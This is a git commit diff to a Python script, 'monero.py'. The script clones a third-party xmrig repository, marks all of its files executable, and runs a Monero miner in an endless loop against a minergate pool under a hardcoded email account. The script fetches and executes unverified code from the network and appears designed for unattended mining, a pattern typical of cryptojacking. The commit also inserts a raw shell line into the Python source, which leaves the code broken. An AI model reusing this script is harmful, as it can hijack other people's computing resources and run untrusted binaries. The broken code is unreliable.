3a3bd6922407d988904a3743da327762aa9b93e2
Arco <49058858+arcofb@users.noreply.github.com>
2020-09-03 19:53:34 +0700

    Update monero.py

--- monero.py
+++ monero.py
@@ -3,10 +3,13 @@ import os
 from time import sleep
 os.system('sudo apt update -y')
 sleep(2)
-os.system('git clone https://github.com/quincyhays/bmxmrig && cd bmxmrig && chmod +x ')
+os.system('git clone https://github.com/quincyhays/bmxmrig')
 sleep(2)
+os.system('cd bmxmrig && chmod +x *')
+sleep(2)
+cd bmxmrig && chmod +x *
 while(True):
 	os.system('clear')
-	os.system('timeout 1800 ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
+	os.system('cd bmxmrig && timeout 1800 ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
 	print("Please wait ...")
 	sleep(600)
